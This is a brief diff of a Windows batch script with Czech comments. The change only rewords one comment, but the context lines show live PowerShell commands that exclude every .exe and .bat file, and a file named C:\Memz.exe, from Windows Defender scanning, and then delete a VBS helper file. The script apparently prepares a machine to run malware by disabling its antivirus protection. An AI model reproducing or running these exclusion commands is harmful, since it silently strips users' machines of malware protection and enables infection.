@@ -19,7 +19,7 @@ timeout /t 1 > nul
 del error.vbs
 exit
 
-::Přidání mezi výjimky vše s příponou .exe, .bat a soubor C:\Memz.exe
+::Přidá mezi výjimky vše s příponou .exe, .bat a soubor C:\Memz.exe
 :start
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".exe""
 powershell.exe -command "Add-MpPreference -ExclusionExtension ".bat""
